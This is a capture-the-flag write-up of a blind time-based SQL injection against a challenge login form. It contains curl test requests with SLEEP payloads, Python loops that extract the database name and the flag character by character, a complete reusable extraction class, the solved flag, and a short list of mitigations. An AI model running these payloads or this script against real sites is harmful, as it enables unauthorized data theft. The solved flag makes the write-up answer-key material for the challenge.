---
title: "SQL Injection - Blind Time-Based Attack"
category: "Web"
difficulty: "Hard"
author: "havoc"
date: "2025-10-28"
description: "Exploiting a blind SQL injection vulnerability using time-based techniques"
---

## Summary

This challenge involved a login form vulnerable to blind SQL injection. Since there was no direct output, we used time-based techniques to extract database information character by character.

## Discovery

The login form at `/login` didn't show any error messages, making it a perfect candidate for blind SQLi testing.

```bash
# Normal request
curl -X POST https://target.ctf.com/login -d "username=admin&password=test"
# Response time: 0.2s

# Time-based injection test
curl -X POST https://target.ctf.com/login -d "username=admin' AND SLEEP(5)-- -&password=test"
# Response time: 5.2s
```

The 5-second delay confirmed the vulnerability!

## Exploitation

### Step 1: Database Enumeration

First, we determined the database name length:

```python
import requests
import time

url = "https://target.ctf.com/login"

for length in range(1, 20):
    payload = f"admin' AND IF(LENGTH(DATABASE())={length}, SLEEP(5), 0)-- -"
    
    start = time.time()
    requests.post(url, data={"username": payload, "password": "test"})
    elapsed = time.time() - start
    
    if elapsed > 5:
        print(f"[+] Database name length: {length}")
        break
```

### Step 2: Character Extraction

Next, we extracted the database name character by character:

```python
import string

db_name = ""
charset = string.ascii_lowercase + string.digits + "_"

for pos in range(1, 9):  # Assuming length of 8
    for char in charset:
        payload = f"admin' AND IF(SUBSTRING(DATABASE(),{pos},1)='{char}', SLEEP(3), 0)-- -"
        
        start = time.time()
        requests.post(url, data={"username": payload, "password": "test"})
        elapsed = time.time() - start
        
        if elapsed > 3:
            db_name += char
            print(f"[+] Database name so far: {db_name}")
            break

print(f"[+] Full database name: {db_name}")
```

### Step 3: Table Discovery

We enumerated tables using the same technique:

```sql
admin' AND IF(
    (SELECT COUNT(*) FROM information_schema.tables 
     WHERE table_schema=DATABASE() AND table_name='users') = 1,
    SLEEP(5), 0
)-- -
```

### Step 4: Flag Extraction

Finally, we located the flag in the `secrets` table:

```python
flag = ""
for pos in range(1, 50):
    for char in string.printable:
        payload = f"admin' AND IF(SUBSTRING((SELECT flag FROM secrets LIMIT 1),{pos},1)='{char}', SLEEP(2), 0)-- -"
        
        start = time.time()
        requests.post(url, data={"username": payload, "password": "test"})
        elapsed = time.time() - start
        
        if elapsed > 2:
            flag += char
            print(f"[+] Flag: {flag}")
            if char == '}':
                break
```

## Flag

```
CTF{t1m3_b4s3d_sql1_1s_sl0w_but_w0rks}
```

## Automated Script

Here's the complete automation script:

```python
#!/usr/bin/env python3
import requests
import time
import string

class BlindSQLi:
    def __init__(self, url):
        self.url = url
        self.charset = string.ascii_lowercase + string.digits + "_{}"
        
    def check_delay(self, payload, delay=3):
        start = time.time()
        requests.post(self.url, data={
            "username": payload,
            "password": "test"
        }, timeout=10)
        return (time.time() - start) > delay
        
    def extract_string(self, query, max_len=50):
        result = ""
        for pos in range(1, max_len):
            for char in self.charset:
                payload = f"admin' AND IF(SUBSTRING(({query}),{pos},1)='{char}', SLEEP(3), 0)-- -"
                if self.check_delay(payload):
                    result += char
                    print(f"[+] Extracted: {result}")
                    if char == '}':
                        return result
                    break
        return result

# Usage
sqli = BlindSQLi("https://target.ctf.com/login")
flag = sqli.extract_string("SELECT flag FROM secrets LIMIT 1")
print(f"[+] Final flag: {flag}")
```

## Lessons Learned

1. **Time-based SQLi is powerful** - Even without error messages or output
2. **Automation is essential** - Manual extraction would take hours
3. **Optimize delay times** - Balance between reliability and speed
4. **Monitor network issues** - Timeouts can cause false positives

## Mitigation

- **Use parameterized queries** - Never concatenate user input
- **Implement input validation** - Whitelist allowed characters
- **Apply WAF rules** - Detect and block SQL injection patterns
- **Add rate limiting** - Slow down automated attacks
- **Monitor query execution time** - Alert on unusually slow queries

---

**Difficulty Rating:** 🔴 Hard  
**Category:** Web Exploitation  
**Points:** 750
